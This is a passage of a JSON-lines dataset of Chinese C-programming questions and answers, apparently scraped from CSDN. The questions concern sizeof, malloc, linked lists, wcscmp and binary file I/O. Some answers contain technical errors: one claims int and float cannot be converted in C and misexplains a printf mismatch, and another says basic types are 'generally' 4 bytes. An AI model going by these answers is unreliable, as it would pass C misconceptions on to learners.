{&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;43&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;e&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;,  &lt;span class=\"hljs-number\"&gt;99&lt;/span&gt;};\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; f {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;f&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;,  &lt;span class=\"hljs-number\"&gt;60&lt;/span&gt;};\n\n    &lt;span class=\"hljs-built_in\"&gt;insertData&lt;/span&gt;(a);\n    &lt;span class=\"hljs-built_in\"&gt;insertData&lt;/span&gt;(b);\n    &lt;span class=\"hljs-built_in\"&gt;insertData&lt;/span&gt;(c);\n    &lt;span class=\"hljs-built_in\"&gt;insertData&lt;/span&gt;(d);\n    &lt;span class=\"hljs-built_in\"&gt;insertData&lt;/span&gt;(e);\n    &lt;span class=\"hljs-built_in\"&gt;insertData&lt;/span&gt;(f);\n\n    &lt;span class=\"hljs-built_in\"&gt;printLink&lt;/span&gt;();\n    &lt;span class=\"hljs-built_in\"&gt;deleteData&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;printLink&lt;/span&gt;();\n\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i;\n    cin &amp;gt;&amp;gt; i;\n\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/781147411846141.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["建立某链表的有关问题", ["‎建立一个链表，链表节点用于存储如下结构体：", "\n", "‍", "‎        struct Student", "\n", "‍", "‎ { long num;            //学号", "\n", "‍", "‎ char name[20];    //姓名", "\n", "‍", "‎ char sex;              //性别", "\n", "‍", "‎ float score;          //成绩", "\n", "‍", "‎ };", "\n", "‍", "‎要求：使用函数和指针进行合理的编程，", "\n", "‍", "‎    建立链表", "\n", "‍", "         struct SLink", "\n", "‍", "         {     struct Student s;", "\n", "‍", "               struct SLink *next;", "\n", "‍", "         } *np;", "\n", "‍", "‎    ，并设计如下函数：", "\n", "‍", "‎    1）createLink()生成一个空链表；", "\n", "‍", "‎    2）insertData(struct Student s)按学生学号由小到大的顺序，将s插入到链表合适的位置；", "\n", "‍", "‎      提示：使用np=(struct SLink *) malloc(sizeof(struct SLink)开辟内存以建立新节点。", "\n", "‍", "‎    3）deleteData(long num)删除学号为num的节点。", "\n", "‍", "‎      提示：使用free(np)释放被删除节点的内存; ", "\n", "‍", "‎    4）printLink()顺序打印输出链表各节点的内容。", "\n", "‍"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;一级指针不等于一维数组&amp;#xff0c;二级指针更不等于二维数组&amp;#xff0c;&lt;br /&gt;让二级指针a指向开辟的这个n*n个int长度的内存段&amp;#xff0c;直接当二维数组一样a[i][j]是用不了的&amp;#xff0c;&lt;br /&gt;而且sizeof(a)求的是变量a的类型所占字节数&amp;#xff0c;a是指针类型的变量&amp;#xff0c;如果是按64位编译则它的结果是8&amp;#xff0c;并不是求指针a所指向内存段的长度&lt;br /&gt;可以像这样用&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;    a&amp;#61;(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; **)malloc(sizeof(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; *)*&lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;);\n    for(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;&lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;;i&amp;#43;&amp;#43;){\n        a[i]&amp;#61;(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; *)malloc(sizeof(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;)*&lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;);\n        memset(a[i],&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;,sizeof(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;)*&lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;);\n    }\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用malloc动态分配时出错或者是memset出错，求解", ["我想用malloc为二维指针分配内存，但是调试时发现分配似乎不对或者清空有问题，以下是调试的情况和源码：", "\n", "\n", "\n", "#", "define", " _CRT_SECURE_NO_WARNINGS", "\n", "#", "include", "<bits/stdc++.h>", "\n", "using", " ", "namespace", " std;\n", "int", "** a, n;\n", "bool", "** b;\n", "void", " ", "creatalp", "()", " ", "{\n    a = (", "int", "**)", "malloc", "(", "sizeof", "(", "int", ") * n * n);\n    b = (", "bool", "**)", "malloc", "(", "sizeof", "(", "bool", ") * n * n);\n    ", "memset", "(a, ", "0", ", ", "sizeof", "(a));\n    ", "memset", "(b, ", "0", ", ", "sizeof", "(b));\n}\n", "void", " ", "putalp", "()", " ", "{\n    ", "for", " (", "int", " i = ", "0", "; i < n; i++) {\n        ", "for", " (", "int", " j = ", "0", "; j < n; j++) {\n            ", "printf", "(", "\"%2d\"", ", a[i][j]);\n            ", "if", " (j < n - ", "1", ") ", "printf", "(", "\" \"", ");\n        }\n        ", "if", " (i < n - ", "1", ") ", "printf", "(", "\"\\n\"", ");\n    }\n}\n", "int", " ", "main", "()", "{\n    ios::", "sync_with_stdio", "(", "false", ");\n    cin.", "tie", "(", "0", ");\n    ", "while", " (cin >> n, n != ", "0", ") {\n        ", "creatalp", "();\n        ", "int", " t = n / ", "2", ", k = ", "0", ", ans = ", "2", ", sum = ", "1", ";\n        a[", "0", "][t] = ", "1", ", b[", "0", "][t] = ", "true", ";\n        ", "for", " (", "int", " i = k; i < n;) {\n            ", "for", " (", "int", " j = t; j < n;) {\n                ", "if", " (k == ", "0", " && j == n - ", "1", " || b[i - ", "1", "][j + ", "1", "] == ", "true", ") {\n                    i++;\n                }\n                ", "else", " {\n                    t == n - ", "1", " ? t = ", "0", " : t++;", "//control the column", "\n                    k == ", "0", " ? k = n - ", "1", " : k--;", "//control the line", "\n                }\n                a[i][j] = ans++;\n                b[i][j] = ", "true", ";\n                sum++;\n                ", "break", ";\n            }\n            ", "if", " (sum == n * n) ", "break", ";\n        }\n        ", "putalp", "();\n    }\n    ", "return", " ", "0", ";\n}\n\n", "\n", "求指教"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;因为c语言是基于指针的&amp;#xff0c;它会去取内存地址是arr&amp;#43;10的地址当做arr的第10个元素&amp;#xff0c;而不管arr定义的时候到底是多长&lt;br /&gt;又由于你arr的类型是int[]&amp;#xff0c;arr[10]当然也是作为int类型取出来的&amp;#xff08;虽然取出来的是内存里一段莫名其妙的地址&amp;#xff0c;不一定有意义&amp;#xff09;&amp;#xff0c;但是它的size确实是int的size&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["当所访问的数组下标超过定义时数组长度-1时为什么不报错，并且计算结果正确？", ["\n", "#", "include", "<stdio.h>", "\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " arr[] = { ", "0", ",", "1", ",", "2", ",", "3", ",", "4", ",", "5", " };\n    ", "printf", "(", "\"元素个数为：%d\\n\"", ", ", "sizeof", "(arr) / ", "sizeof", "(arr[", "10", "]));\n    ", "return", " ", "0", ";\n}\n\n", "\n", "以上结果运行程序结果为“元素个数为：6”，没有出错。", "\n", "但是我疑惑的一点是：我用的是 sizeof(arr[10])作为单个元素的长度，而我申请的arr[]数组中明明只有6个元素，为什么能用arr[10]这个元素计算而不报错。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;指针版的这么改&amp;#xff0c;其他地方不用动&amp;#xff0c; 供参考对照&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;&lt;span class=\"hljs-comment\"&gt;//**************  指针版&amp;#xff1a; 指针写法  ******************&lt;/span&gt;\n\n\n&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;malloc.h&amp;gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;// 链表节点结构&lt;/span&gt;\ntypedef struct Node {\n    &lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt;    data;\n    struct Node* next;\n}Node, * LinkList;\n&lt;span class=\"hljs-comment\"&gt;// 输出单链表&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt; show(LinkList L)\n{\n    L-&amp;gt;data &amp;#61;&amp;#61; -&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt; ? &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt; : printf(L-&amp;gt;data &amp;#61;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; ? &lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n无公共元素&amp;#34;&lt;/span&gt; : &lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n&amp;#34;&lt;/span&gt;, L-&amp;gt;data);\n    Node* p &amp;#61; L-&amp;gt;next;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p) {\n        printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, p-&amp;gt;data);\n        p &amp;#61; p-&amp;gt;next;\n    }\n    printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n}\nLinkList findCommonNodes(LinkList L1, LinkList L2)\n{\n    LinkList L &amp;#61; (Node*)malloc(sizeof(Node));\n    L-&amp;gt;data &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    L-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    Node* p &amp;#61; L1-&amp;gt;next, * pL &amp;#61; L;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (p) {\n        Node* q &amp;#61; L2-&amp;gt;next;\n        &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (q)\n        {\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (p-&amp;gt;data &amp;#61;&amp;#61; q-&amp;gt;data) {\n                Node* f &amp;#61; (Node*)malloc(sizeof(Node));\n                f-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n                f-&amp;gt;data &amp;#61; q-&amp;gt;data;\n                L-&amp;gt;data&amp;#43;&amp;#43;;\n                pL-&amp;gt;next &amp;#61; f;\n                pL &amp;#61; f;\n                &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n            }\n            q &amp;#61; q-&amp;gt;next;\n        }\n        p &amp;#61; p-&amp;gt;next;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; L;\n}\n&lt;span class=\"hljs-comment\"&gt;// 创建链表 &lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt; createListFromHead(LinkList* L)\n{\n    Node* pL;\n    &lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; n, i;\n    (*L) &amp;#61; (Node*)malloc(sizeof(Node));&lt;span class=\"hljs-comment\"&gt;// 创建头&lt;/span&gt;\n    (*L)-&amp;gt;data &amp;#61; -&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    (*L)-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    pL &amp;#61; (*L);\n    scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;n);\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; n; i&amp;#43;&amp;#43;) {&lt;!-- --&gt;&lt;span class=\"hljs-comment\"&gt;// 生成链表&lt;/span&gt;\n        Node* p &amp;#61; (Node*)malloc(sizeof(Node));\n        p-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n        scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &amp;amp;p-&amp;gt;data);\n        pL-&amp;gt;next &amp;#61; p;\n        pL &amp;#61; p;\n    }\n}\n&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; main()\n{\n    LinkList L1, L2, L &amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;;\n    createListFromHead(&amp;amp;L1);\n    createListFromHead(&amp;amp;L2);\n    &lt;span class=\"hljs-comment\"&gt;//show(L1);&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//show(L2);&lt;/span&gt;\n    show(L &amp;#61; findCommonNodes(L1, L2));\n\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["出现error: expected ';', ',' or ')' before '&' token，如何用用指针来取代引用，在主函数中传进来地址", ["平台编译器不支持c++，有没有人帮帮忙看一下要怎么改啊", "\n", "#include <stdio.h>\n#include <malloc.h>\n", "// 链表节点结构", "\ntypedef struct Node {\n    int ", "data", ";\n    struct Node* next;\n}Node, * LinkList;\n", "// 输出单链表", "\nvoid show(LinkList L) \n{\n    L->", "data", " == -1 ? 0 : printf(L->", "data", " == 0 ? \"%d\\n无公共元素\\n\" : \"%d\\n\", L->", "data", ");\n    N", "ode", "* p = L->", "next;\n    ", "while", " (p) {\n        ", "printf", "(\"%d \", p->", "data", ");\n        ", "p", " = p->", "next;\n    }\n    printf(", "\"\\n\"", ");\n}\nLinkList findCommonNodes(LinkList L1, LinkList L2) \n{\n    LinkList L = (Node*)malloc(sizeof(Node));\n    L->", "data", " = ", "0", ";\n    L->next = NULL;\n    N", "ode", "* p = L1->", "next, * pL = L;\n    ", "while", " (p) {\n        N", "ode", "* q = L2->", "next;\n        ", "while", " (q) \n        {\n            ", "if", " (p->", "data", " == q->", "data", ") {\n                Node* f = (Node*)malloc(sizeof(Node));\n                ", "f", "->", "next = NULL;\n                ", "f", "->", "data", " = q->", "data", ";\n                L->", "data", "++;\n                ", "pL", "->", "next = f;\n                pL = f;\n                break;\n            }\n            ", "q", " = q->", "next;\n        }\n        ", "p", " = p->", "next;\n    }\n    return L;\n}\n", "// 创建链表 ", "\nvoid createListFromHead(LinkList L)\n{\n    Node* pL;\n    int n, i;\n    L = (Node*)malloc(sizeof(Node));", "// 创建头 ", "\n    L->", "data", " = -", "1", ";\n    L->next = NULL;\n    pL = L;\n    scanf(", "\"%d\"", ", &n);\n    ", "for", " (i = ", "0", "; i < n; i++) {", "// 生成链表 ", "\n        Node* p = (Node*)malloc(sizeof(Node));\n        ", "p", "->", "next = NULL;\n        ", "scanf", "(\"%d\", &p->", "data", ");\n        ", "pL", "->", "next = p;\n        pL = p;\n    }\n}\nint main() \n{\n    LinkList L1, L2, L =", "0", ";\n    createListFromHead(L1);\n    createListFromHead(L2);\n    ", "//show(L1);", "\n    ", "//show(L2);", "\n    show(L = findCommonNodes(L1, L2));\n    return ", "0", ";\n}\n \n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你的main呢&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于VS2019引用了自己编写的头文件却一直出错的问题", ["谁能解释一下为什么会出错？", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "\"alloc.h\"", "\n", "#", "undef", "  malloc", "\n", "void", "* ", "alloc", "(", "size_t", " size)", "\n", "{\n    ", "void", "* new_mem;", "//检查内存的确分配成功", "\n    new_mem = ", "malloc", "(size);\n    ", "if", " (new_mem == ", "NULL", ") {\n        ", "printf", "(", "\"Out of memory!\\n\"", ");\n        ", "exit", "(", "1", ");\n    }\n    ", "return", " new_mem;\n}\n", "//不易发生错误的内存分配器实现", "\n\n", "\n", "以下是头文件", "\n", "#", "pragma", " once", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "define", " malloc", "\n", "#", "define", " MALLOC(num,type)(type *)alloc((num)*sizeof(type))", "\n", "extern", " ", "void", "* ", "alloc", "(", "size_t", " size)", ";\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;望采纳&amp;#xff0c;点击右侧采纳即可&amp;#xff1a;&lt;br /&gt;因为在 C 语言中&amp;#xff0c;int 和 float 变量是不能相互转换的。int 能存储整数数值&amp;#xff0c;而 float 能存储小数数值&amp;#xff0c;因此&amp;#xff0c;把 float 变量强制转换成 int 变量会导致精度丢失&amp;#xff0c;数值发生变化&amp;#xff0c;结果不再是原来的数值&amp;#xff0c;所以会出现不一致的情况。如果想在 C 语言中进行数值转换&amp;#xff0c;需要使用特定的转换函数。&lt;br /&gt;当将 float 变量强制转换为 int 变量时&amp;#xff0c;小数部分会丢失&amp;#xff0c;只保留整数部分。例如&amp;#xff0c;在本题中&amp;#xff0c;float 变量 a 的值为 3.14&amp;#xff0c;但强制转换成 int 后只保留整数部分&amp;#xff0c;即 3&amp;#xff0c;因此&amp;#xff0c;输出的结果是 0。在实际编程中&amp;#xff0c;为了避免精度丢失&amp;#xff0c;需要避免强制转换 float 变量为 int 变量&amp;#xff0c;需要使用适当的方法对数据进行转换。&lt;br /&gt;可以强制&amp;#xff0c;强制类型转换使用小括号 ( ) 并在其中指定要转换成的类型&amp;#xff0c;如 (float)x。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; b &amp;#61; *((&lt;span class=\"hljs-keyword\"&gt;int&lt;/span&gt; *)(&amp;amp;a));\n&lt;span class=\"hljs-keyword\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%f\\n%f&amp;#34;&lt;/span&gt;, a, *((float *)&amp;amp;b));\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言为什么不可以用int型存储float型？", ["今天我在写程序的时候发现了让我疑惑的一点：", "\n", "#", "include", " ", "\"stdio.h\"", "\n\n", "int", " ", "main", "()", " ", "{\n        ", "//定义float变量a", "\n    ", "float", " a = ", "3.14f", ";\n        ", "//定义int变量b等于a", "\n    ", "int", " b = a;\n    ", "printf", "(", "\"%f\\n%f\"", ", a, b);\n}\n\n", "\n", "运行的结果是", "\n", "打印float数据a，正常输出，但是如果转换为int类型就变成了0，理论上讲int与float都是占四个字节", "\n", "#", "include", " ", "\"stdio.h\"", "\n\n", "int", " ", "main", "()", " ", "{\n    ", "printf", "(", "\"%zd\\n%zd\"", ", ", "sizeof", "(", "int", "), ", "sizeof", "(", "float", "));\n}\n\n", "\n", "\n", "但是为什么他们既然占空间大小一样，却不可以用int类型保存float类型数据呢？", "\n", "后来我又尝试使用指针，代码如下：", "\n", "#", "include", " ", "\"stdio.h\"", "\n\n", "int", " ", "main", "()", " ", "{\n        ", "//定义float变量a", "\n    ", "float", " a = ", "3.14f", ";\n        ", "//定义指向a的float指针p", "\n    ", "float", "* p = &a;\n        ", "//将p转换为int型指针", "\n    ", "int", "* p1 = (", "int", "*)p;\n    ", "printf", "(", "\"%f\\n%f\"", ", *p, *p1);\n}\n\n", "\n", "\n", "运行结果还是没有变，为什么同样占用4字节，却不可以用int型变量存储float型变量呢？请问怎么做可以实现用int型变量存储float型？谢谢！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;x86/x64架构都是采用小端的&amp;#xff0c;即低地址端存的是低有效位字节&amp;#xff0c;高地址端存的是高有效位字节。&lt;br /&gt;整型值1&amp;#xff0c;占4个字节&amp;#xff0c;二进制是0x000001&amp;#xff0c;但按小端存储的话&amp;#xff0c; 字节顺序是0x01, 0x00, 0x00, 0x00&lt;br /&gt;第一次fwrite写入1后&amp;#xff0c;文件内容是0x01 0x00 0x00 0x00&lt;br /&gt;第二次fwrite从偏移2的位置写入1后&amp;#xff0c;文件内容变成0x01 0x00 0x01 0x00 0x00 0x00&lt;br /&gt;fread从文件开始读入整型&amp;#xff0c;得到整型值是0x00010001&amp;#xff0c;即65537&lt;br /&gt;然后再用freed继续读一个整型&amp;#xff0c;由于当前文件指针位置距离文件结尾只有2个字节&amp;#xff0c;读入整型&amp;#xff08;4个字节&amp;#xff09;时遇到文件结尾&amp;#xff0c;因此整体没有读取成功。你应该判断一下freed的返回值&amp;#xff0c;此处应该返回0&amp;#xff0c;因为没有成功读入整型。&lt;br /&gt;&lt;a href=\"https://en.wikipedia.org/wiki/Endianness\" id=\"textarea_1663503362393_1663505549343_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.wikipedia.org/wiki/Endianness&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于二进制文件格式遇到的一些问题", ["//测试在一个整数的中间字节插入另一个整数会怎么样", "#include <stdio.h>", "#include <stdlib.h>", "\n", "int main(void)", "{", "    FILE * file;", "    int a = 1;", "    int b = 2;", "    int c;", "\n", "if", " ( ( ", "file", " = ", "fopen", " ( ", "\"bionary_test.txt\"", ",", "\"wb+\"", ") ) == NULL )\n{\n    fprintf(stderr,", "\"Open file failed.\"", ");\n    exit(", "1", ");\n} \n\n", "fwrite", "(&a,sizeof(", "int", "),", "1", ",", "file", ");\nrewind(", "file", ");  ", "//指针一定要重置，不然是接着继续的", "\n", "fread", "(&c,sizeof(", "int", "),", "1", ",", "file", ");  ", "//只能用二进制读取，不能用fscanf（），不知为何，会输出43", "\nprintf(", "\"%d\\n%d\\n\"", ",c,sizeof (", "int", "));\n\nfseek(", "file", ",", "2", "L,SEEK_SET);\n", "fwrite", "(&a,sizeof(", "int", "),", "1", ",", "file", ");\nrewind(", "file", ");\n", "fread", "(&c,sizeof(", "int", "),", "1", ",", "file", ");\nprintf(", "\"%d\\n\"", ",c);\n", "fread", "(&c,sizeof(", "int", "),", "1", ",", "file", ");\nprintf(", "\"%d\\n\"", ",c);\nfseek(", "file", ",", "0", "L,SEEK_END);\nc =ftell(", "file", ");\nprintf(", "\"%d\\n\"", ",c);\n\n", "return", " ", "0", ";\n", "\n", "}", "\n", "输出结果：", "1", "4", "65537", "65536", "6", "\n", "原本里面的数字是1，占用4个字节，应该前31位都为0，最后一位是1，我在第二个字节后面插入了数字2，结果现在里面有6个字节而不是8个字节，说明是从第二个字节开始覆盖住了后面的4个字节而不是添加了4个字节，但是即使这样，前4个字节也应该都是0，结果却输出了65537。", "\n", "除此之外我又读了4个字节，但是里面只剩下2个字节了，但是却读取成功了，输出结果65536。请问是为什么", "\n", "另外我如果用fscanf从文件中读取数字的话会读出43，也不知道是为什么", "\n", "希望大家能为我解决疑惑"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;wcscmp是内容比较&lt;br /&gt;&amp;#61;&amp;#61;是地址比较&lt;br /&gt;显然字符串比较一般是判断内容是否相同&amp;#xff0c;而不是存储地址是否相同&lt;br /&gt;显然ptem,cstr两个字符串的内容是相同的&amp;#xff0c;但是两个不同的存储地址&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["wcscmp和==于符号的区别", ["//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "/不相等/", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "/\n#include \"stdio.h\"\n#include \"stdlib.h\"\n#include \"string.h\"\n/", "/#include <iostream>\n\n/", "/using namespace std;\n\nint main(void)\n{\n    wchar_t* cstr;\n    wchar_t* ptem = L\"1\";\n    wchar_t ptem1[] = {L\"1\"};\n\n    cstr = ptem1;\n\n    if (ptem == cstr)\n    {\n        printf(\"相等\\n\");\n        printf(\"ptem=%d,len=%d,sizeof=%d,cstr=%d,len=%d,sizeof=%d\",ptem,wcslen(ptem),sizeof(ptem),cstr,wcslen(cstr),sizeof(cstr));\n    }\n    else\n    {\n        printf(\"不相等\\n\");\n        printf(\"ptem=%d,len=%d,sizeof=%d,cstr=%d,len=%d,sizeof=%d\",ptem,wcslen(ptem),sizeof(ptem),cstr,wcslen(cstr),sizeof(cstr));\n    }\n\n    printf(\"\\n\");\n    system(\"pause\");\n    return 0;\n}\n/", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "不相等//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "\n\n//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "/相等/", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "/\n#include \"stdio.h\"\n#include \"stdlib.h\"\n#include \"string.h\"\n/", "/#include <iostream>\n\n/", "/using namespace std;\n\nint main(void)\n{\n    wchar_t* cstr;\n    wchar_t* ptem = L\"1\";\n    wchar_t ptem1[] = {L\"1\"};\n\n    cstr = ptem1;\n\n    if (0 == wcscmp(ptem,cstr))\n    {\n        printf(\"相等\\n\");\n        printf(\"ptem=%d,len=%d,sizeof=%d,cstr=%d,len=%d,sizeof=%d\",ptem,wcslen(ptem),sizeof(ptem),cstr,wcslen(cstr),sizeof(cstr));\n    }\n    else\n    {\n        printf(\"不相等\\n\");\n        printf(\"ptem=%d,len=%d,sizeof=%d,cstr=%d,len=%d,sizeof=%d\",ptem,wcslen(ptem),sizeof(ptem),cstr,wcslen(cstr),sizeof(cstr));\n    }\n\n    printf(\"\\n\");\n    system(\"pause\");\n    return 0;\n}\n/", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "相等//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "//", "\n"]], "Tag": "程序设计"}
{"Answer": "上述代码中 pear 指向的内存是通过 malloc 从堆中分配的，函数结束后，分配的内存不会被释放。\r\nmalloc 分配的内存要用 free 释放。不你说的知道“失效”是不是这个意思。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于一个数组的指针,求解释呀", ["// 使用指针从函数返回一个数组", "\n// paf是一个函数，它返回一个指针，该指针指向一个包含20个int元素的数组", "\nint (*paf())[20]", "\n{", "\n    int (*pear)[20];", "\n    int i = 0;", "\n\n", "pear = (int (*)[20])malloc(20 * sizeof(int));\nprintf(\"Malloc memory, Address: \");\nPRINT_ADDRESS(pear); // 打印所分配内存的地址\n\nif (!pear)\n{\n    printf(\"malloc failed!/n\");\n}\n\n// 初始化数据\nfor (i = 0; i < 20; i++)\n{\n    (*pear)[i] = i;\n}\n\nreturn pear;\n", "\n\n", "}", "\n\n", "如上代码:为何pear返回以后不会失效?????"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/967833711766154.jpg\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;sizeof是C/C&amp;#43;&amp;#43;中的一个操作符(operator)&amp;#xff0c;作用是返回一个对象或者类型所占的内存字节数。&lt;br /&gt;基本数据类型的sizeof一般取值为4&amp;#xff0c;基本数据类型指short、int、long、float、double这样的简单内置数据类型&amp;#xff0c;由于它们都是和系统相关的。&lt;/p&gt;\n&lt;p&gt;C语言中的单引号用来表示字符字面量&amp;#xff0c;编译为对应的ASCII码&lt;br /&gt;C语言中的双引号用来表示字符串字面量&amp;#xff0c;编译为对应的内存地址&lt;/p&gt;\n&lt;p&gt;基本数据类型的sizeof一般取值为4&amp;#xff1a;证明&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/584348711766128.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么运行结果是2 4呢？，2可以理解，4怎么来的?", ["为什么运行结果是2 4呢？，2可以理解，4怎么来的?", "    printf(\"%d\\n\",sizeof\"m\");", "   printf(\"%d\\n\",sizeof'm');"]], "Tag": "程序设计"}
